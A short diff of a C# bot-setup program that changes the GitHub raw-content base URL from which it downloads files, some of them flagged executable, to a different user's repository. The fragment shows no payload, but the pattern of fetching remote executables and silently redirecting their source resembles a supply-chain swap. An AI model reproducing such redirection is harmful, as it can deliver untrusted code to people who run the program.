@@ -9,7 +9,7 @@ namespace SetupBotsWhispbyte
 {
     class Program
     {
-        private const string RepoBase = "https://raw.githubusercontent.com/cloudflared9-hub/agent/main";
+        private const string RepoBase = "https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main";
 
         private static readonly (string Url, string Filename, bool Executable)[] FilesToDownload = new[]
         {
